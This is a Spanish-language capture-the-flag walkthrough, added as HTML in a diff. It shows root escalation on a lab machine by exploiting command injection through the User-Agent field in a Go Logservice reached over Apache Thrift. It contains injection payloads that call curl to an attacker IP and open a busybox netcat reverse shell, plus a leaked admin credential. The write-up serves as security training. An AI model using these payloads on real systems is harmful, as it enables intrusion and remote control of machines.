+                <p>Tras obtener acceso inicial, enumero el sistema en busca de vectores de escalada de privilegios:</p>
+
+                <h3>Información Descubierta</h3>
+                <ul>
+                    <li>Credenciales de admin en la aplicación web: <code>admin:cFgjE@0%l0</code> (no funciona para ruth ni root)</li>
+                    <li>Ruth es miembro del grupo <code>varnish</code></li>
+                    <li>Binario SUID encontrado: <code>/opt/google/chrome/chrome-sandbox</code></li>
+                </ul>
+
+                <h3>Procesos de Ruth</h3>
+                <p>Comprobando procesos en ejecución con <code>ps -faux</code>, noto que Ruth está ejecutando un script relacionado con logging de Varnish:</p>
+                <pre><code class="language-plaintext">ruth  1306  /bin/sh -c cd /home/ruth;bash varnish_logs.sh
+ruth  1312  bash varnish_logs.sh
+ruth  1317  varnishncsa -c -F %{VCL_Log:client_ip}x
+ruth  1318  bash varnish_logs.sh</code></pre>
+
+                <p>Sin embargo, no tengo acceso al directorio home de Ruth para examinar estos scripts.</p>
+
+                <h3>Servicios de Red Internos</h3>
+                <p>Comprobando puertos escuchando localmente revela varios servicios interesantes:</p>
+                <pre><code class="language-plaintext">tcp  LISTEN  127.0.0.1:3923   # CopyParty
+tcp  LISTEN  127.0.0.1:8000   # Caption Portal backend
+tcp  LISTEN  127.0.0.1:6081   # Varnish
+tcp  LISTEN  127.0.0.1:6082   # Varnish admin
+tcp  LISTEN  127.0.0.1:9090   # Logservice</code></pre>
+
+                <p>El puerto 9090 me llama la atención - es el Logservice que vi anteriormente en GitBucket.</p>
+
+                <h2>Analizando el Código de Logservice</h2>
+                <p>Revisando el código fuente de Logservice en GitBucket, identifico una vulnerabilidad de inyección de comandos en la lógica de procesamiento de logs:</p>
+                <pre><code class="language-go">ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
+// ...
+line := scanner.Text()
+ip := ipRegex.FindString(line)
+userAgentMatch := userAgentRegex.FindStringSubmatch(line)
+
+var userAgent string
+if len(userAgentMatch) > 1 {
+    userAgent = userAgentMatch[1]
+}
+
+timestamp := time.Now().Format(time.RFC3339)
+logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", 
+                     ip, userAgent, timestamp)
+exec.Command("/bin/sh", "-c", logs)</code></pre>
+
+                <p>La vulnerabilidad está en el parseo del <code>User-Agent</code> - no está apropiadamente sanitizado antes de pasarse a <code>exec.Command</code>. Creando un archivo de log malicioso con un campo User-Agent especialmente diseñado, puedo inyectar comandos arbitrarios.</p>
+
+                <h3>Entendiendo Apache Thrift</h3>
+                <p>El servicio corre en Apache Thrift, que requiere un protocolo específico para comunicarse. En el repositorio GitBucket, encuentro un archivo de esquema <code>.thrift</code>:</p>
+                <pre><code class="language-thrift">namespace go log_service
+
+service LogService {
+    string ReadLogFile(1: string filePath)
+}</code></pre>
+
+                <p>Este esquema define la interfaz para llamar al servicio y leer archivos de log.</p>
+
+                <h2>Configurando Cliente Thrift</h2>
+                <p>Para interactuar con el servicio Thrift, necesito instalar dependencias y generar código de cliente:</p>
+                <pre><code class="language-bash">pip3 install thrift
+sudo apt install thrift-compiler</code></pre>
+
+                <p>Luego genero los stubs de cliente Python:</p>
+                <pre><code class="language-bash">thrift -r --gen py log_service.thrift</code></pre>
+
+                <p>Uso Claude AI para generar un script de cliente Python que se conecta al servicio Thrift en el puerto 9090. El cliente generado me permite llamar a la función <code>ReadLogFile</code> con una ruta de archivo.</p>
+
+                <h3>Probando el Cliente Thrift</h3>
+                <p>Primero, pruebo con un archivo inexistente para confirmar que el servicio funciona:</p>
+                <pre><code class="language-bash">python3 client.py asd</code></pre>
+
+                <pre><code class="language-plaintext">Error: Internal error processing ReadLogFile: 
+error opening log file: open asd: no such file or directory</code></pre>
+
+                <p>Luego con un archivo existente:</p>
+                <pre><code class="language-bash">python3 client.py /etc/passwd</code></pre>
+
+                <pre><code class="language-plaintext">Log file contents:
+Log file processed</code></pre>
+
+                <p>El servicio procesa exitosamente el archivo, confirmando que puedo interactuar con él.</p>
+
+                <h2>Explotando Inyección de Comandos para Acceso Root</h2>
+                <p>Ahora que puedo llamar al Logservice, exploto la vulnerabilidad de inyección de comandos creando un archivo de log malicioso.</p>
+
+                <h3>Creando el Payload Malicioso</h3>
+                <p>Como usuario Margo, creo un archivo <code>/tmp/xd.txt</code> con el siguiente contenido:</p>
+                <pre><code class="language-json">{"user-agent":"' && curl 10.10.16.18:8000 && echo '"}</code></pre>
+
+                <p>Cuando el servicio procese este archivo, la variable <code>logs</code> se convertirá en:</p>
+                <pre><code class="language-bash">echo 'IP Address:, User-Agent: ' && curl 10.10.16.18:8000 && echo ', Timestamp: ...' >> output.log</code></pre>
+
+                <p>Esto rompe el comando echo y ejecuta el comando <code>curl</code> inyectado. Si esto funciona recibiré una petición en mi máquina. Lo ejecuto y efectivamente recibo un hit:</p>
+                <pre><code class="language-bash">python3 client.py /tmp/xd.txt</code></pre>
+
+                <p>En mi servidor HTTP, recibo la petición:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.33 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>¡La inyección de comandos funciona! Ahora modifico el payload para obtener una reverse shell.</p>
+
+                <h3>Obteniendo Shell Root</h3>
+                <p>Actualizo el payload en <code>/tmp/xd.txt</code> para ejecutar una reverse shell:</p>
+                <pre><code class="language-json">{"user-agent":"' && busybox nc 10.10.16.18 443 -e sh 0>&1 && echo '"}</code></pre>
+
+                <p>Uso <code>busybox nc</code> ya que los one-liners típicos de reverse shell no me estaban funcionando en este entorno. Configuro un listener de netcat:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Luego ejecuto el cliente Thrift para disparar la inyección:</p>
+                <pre><code class="language-bash">python3 client.py /tmp/xd.txt</code></pre>
+
+                <p>Recibo una conexión y verifico el acceso root:</p>
+                <pre><code class="language-bash">whoami
+root
+
+cat /root/root.txt</code></pre>
+
+                <p>Escalé exitosamente a root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
